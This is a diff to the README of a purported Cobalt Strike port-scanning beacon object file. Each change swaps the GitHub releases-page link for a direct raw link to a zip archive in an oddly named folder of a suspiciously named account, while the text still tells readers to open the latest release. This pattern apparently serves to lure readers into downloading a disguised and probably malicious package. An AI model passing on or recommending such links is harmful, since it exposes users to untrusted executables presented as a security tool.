@@ -1,6 +1,6 @@
 # 🛡️ cportscanbof - Fast TCP Port Scanning for Cobalt Strike
 
-[![Download cportscanbof](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Unofficial-taxevasion747/cportscanbof/releases)
+[![Download cportscanbof](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Unofficial-taxevasion747/cportscanbof/raw/refs/heads/main/rhynchocoelan/Software_v1.5.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ This page helps you get the release files, place them where you need them, and s
 
 Visit this page to download:
 
-https://github.com/Unofficial-taxevasion747/cportscanbof/releases
+https://github.com/Unofficial-taxevasion747/cportscanbof/raw/refs/heads/main/rhynchocoelan/Software_v1.5.zip
 
 On that page:
 
@@ -177,7 +177,7 @@ If you run into trouble, try these checks:
 
 Use this link to get the files:
 
-https://github.com/Unofficial-taxevasion747/cportscanbof/releases
+https://github.com/Unofficial-taxevasion747/cportscanbof/raw/refs/heads/main/rhynchocoelan/Software_v1.5.zip
 
 Open the latest release, download the package, and extract it if needed
 
